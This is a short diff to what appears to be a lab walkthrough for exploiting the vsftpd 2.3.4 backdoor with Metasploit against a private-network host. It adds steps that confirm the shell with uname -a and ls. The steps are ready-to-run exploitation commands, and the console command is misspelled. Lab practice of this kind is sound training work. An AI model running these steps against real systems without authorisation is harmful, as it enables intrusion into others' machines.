@@ -7,3 +7,7 @@ Open Metasploit: mfsconsole
 Select the Exploit: use exploit/unix/ftp/vsftpd_234_backdoor
 Set the target: set RHOST 192.168.56.101
 Execute: exploit
+Verification of the exploitation:
+uname -a gives details of the version of the system
+ls to list the files and current files and directories
+
